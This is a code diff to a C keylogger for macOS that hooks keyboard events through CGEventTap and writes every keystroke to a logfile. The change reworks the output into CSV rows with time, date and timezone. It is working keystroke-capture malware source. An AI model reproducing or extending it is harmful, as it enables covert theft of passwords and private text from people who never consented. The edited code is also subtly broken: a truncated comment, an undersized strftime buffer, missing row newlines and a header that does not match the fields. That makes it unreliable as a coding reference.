@@ -32,8 +32,7 @@ int main(int argc, const char *argv[]) {
         }
     }
 
-    // Get the current time and open the logfile.
-    time_t result = time(NULL);
+    // Get the current 
     logfile = fopen(logfileLocation, "a");
 
     if (!logfile) {
@@ -42,7 +41,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    fprintf(logfile, "key,time");
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
@@ -60,8 +59,13 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    // Print csv row
+    time_t t = time(NULL);
+    struct tm tm = *localtime(&t);
+    char date[26];
+    strftime(date, 10, "%Y-%m-%d", &tm);
+    // Key, Time, Date, TimeZone
+    fprintf(logfile, "%s,%s,%s,%ld", convertKeyCode(keyCode), asctime(&tm), date, tm.tm_gmtoff);
     fflush(logfile);
 
     return event;
